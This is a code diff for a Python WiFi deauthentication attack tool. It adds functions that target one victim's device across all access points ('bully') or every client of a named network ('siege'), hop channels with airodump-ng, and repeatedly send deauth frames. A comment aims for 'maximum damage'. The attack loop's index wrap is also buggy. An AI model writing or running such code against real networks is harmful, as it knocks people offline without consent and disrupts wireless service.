@@ -1,22 +1,32 @@
 import os
 from datetime import datetime
 import time
-from collections import Iterable
-
-
+import subprocess
 
 def get_bully_attack_list(d, victim):
-    # return a dict with channels as keys, for each channel there should be pairs of ap and client
-    # where all client macs are the same, but all access points are different
-    return []
+    l = []
+    for channel in d[victim]["channels"]:
+        for bssid in d[victim]["channels"][channel]:
+            l.append({"channel": channel, "client_mac": victim, "ap_mac":bssid})
+    return l
 
-def get_siege_attack_list(d, clients):
-    # return a dict with channels as keys, for each channel there should be pairs of ap and client
-    return []
+def get_siege_attack_list(d, essid, clients):
+    # list of dictionaries to make it easy to change channels
+    l = []
+    for channel in d[essid]:
+        for  ap_mac in d[essid][channel]:
+            for client_mac in d[essid][channel][ap_mac]:
+                if len(clients) == 0 or client_mac in clients:
+                    l.append({"channel": channel, "client_mac": client_mac, "ap_mac":ap_mac})
+
+    return l
+
 
 def hop_to_channel(c):
-    # TODO benchmark how long it takes to hop channels
-    pass
+    return subprocess.Popen(["airodump-ng", "wlan0mon","-c",str(c)],
+                            stdout=subprocess.PIPE,
+                            stdin=subprocess.PIPE,
+                            stderr=subprocess.PIPE)
 
 
 def begin_attack(
@@ -53,26 +63,26 @@ def begin_attack(
         assert ESSID is None
         assert not dict2 is None
         attack_list = get_bully_attack_list(dict2)
-        channels = [int (k) for k in dict2[victims_mac]["channels"]]
 
     else:
         assert victims_mac is None
         assert not dict1 is None
-        attack_list = get_siege_attack_list(dict1, net_clients)
-        channels = [int(k) for k in dict1[ESSID]]
+        attack_list = get_siege_attack_list(dict1, ESSID, net_clients)
 
     CURR_TIME = datetime.now()
     TIME_DIFF = 0
-    channel_idx = 0
+
+    i = 0
 
     while TIME_DIFF.total_seconds() < attack_time:
-        #cycle through channels array
-        channel_idx = channel_idx + 1 if channel_idx + 1 < len(channels) else 0
-        hop_to_channel(channels[channel_idx])
+        channel = attack_list[i]["channel"]
+        # set the channel
+        airodump = hop_to_channel(channel)
         # TODO Tinker with list_cycles to achieve maximum damage
-        attack_clients(attack_list[channel_idx], 1, wireless_adapter, list_cycles=2, time_between_cycles=0 )
+        attack_clients(attack_list[i], 1, wireless_adapter, list_cycles=2, time_between_cycles=0 )
+        airodump.kill()
         TIME_DIFF = datetime.now() - CURR_TIME
-
+        i = i + 1 if i < len (attack_list) else 0
     return 0
 
 
@@ -136,10 +146,10 @@ def attack_clients(clients_dict,
             print ("terminating timed attack")
             break
         else:
-            for client in clients_dict:
+            for mac_pair in clients_dict:
                 count += 1
-                de_auth_client(client["client_mac"],
-                               client["ap_mac"],
+                de_auth_client(mac_pair["client_mac"],
+                               mac_pair["ap_mac"],
                                deauths=de_auths_per_client,
                                adapter=adapter)
                 if time_between_cycles > 0:
